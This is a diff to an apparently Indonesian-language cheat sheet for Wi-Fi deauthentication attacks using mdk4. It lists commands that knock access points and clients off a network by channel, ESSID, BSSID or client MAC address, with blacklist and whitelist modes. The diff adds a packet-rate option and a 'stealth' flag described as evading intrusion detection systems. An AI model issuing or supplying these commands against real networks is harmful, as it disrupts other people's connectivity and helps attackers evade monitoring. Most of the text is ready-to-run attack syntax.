@@ -59,7 +59,6 @@ sudo airodump-ng [interface]
       ```
       sudo mdk4 [interface] d -c [channel]
       ```
-
    2. Blacklist mode:
 
       ```
@@ -68,7 +67,6 @@ sudo airodump-ng [interface]
       
       - Blacklist mode hanya melakukan deauth terhadap MAC address yang ada di file `[file_blacklist]`.
       - File `[file_blacklist]` berisi MAC address AP (BSSID) atau client yang akan di-deauth.
-
    3. Whitelist mode:
 
       ```
@@ -77,22 +75,36 @@ sudo airodump-ng [interface]
 
       - Whitelist mode melakukan deauth terhadap semua MAC address, kecuali yang ada di file `[file_whitelist]`.
       - File `[file_whitelist]` berisi MAC address AP (BSSID) atau client yang akan dilindungi dari deauth.
-   4. Target AP berdasarkan ESSID:
+   4. Speed Control:
+
+      ```
+      sudo mdk4 [interface] d -s [speed] -c [channel]
+      ```
+
+      Speed control untuk mengatur kecepatan pengiriman paket dalam packets per second (pps). Tanpa opsi `-s`, defaultnya unlimited (tergantung kemampuan hardware).
+   5. Mode stealth:
+
+      ```
+      sudo mdk4 [interface] d -c [channel] -x
+      ```
+
+      Opsi `-x` mengaktifkan IDS stealth dengan menyesuaikan sequence numbers paket untuk menghindari deteksi oleh Intrusion Detection System.
+   6. Target AP berdasarkan ESSID:
 
       ```
       sudo mdk4 [interface] d -E [essid] -c [channel]
       ```
-   5. Target AP berdasarkan BSSID:
+   7. Target AP berdasarkan BSSID:
 
       ```
       sudo mdk4 [interface] d -B [bssid] -c [channel]
       ```
-   6. Target client spesifik:
+   8. Target client spesifik:
 
       ```
       sudo mdk4 [interface] d -S [mac_client] -c [channel]
       ```
-   7. Whitelist station spesifik:
+   9. Whitelist station spesifik:
 
       ```
       sudo mdk4 [interface] d -W [mac_client] -c [channel]
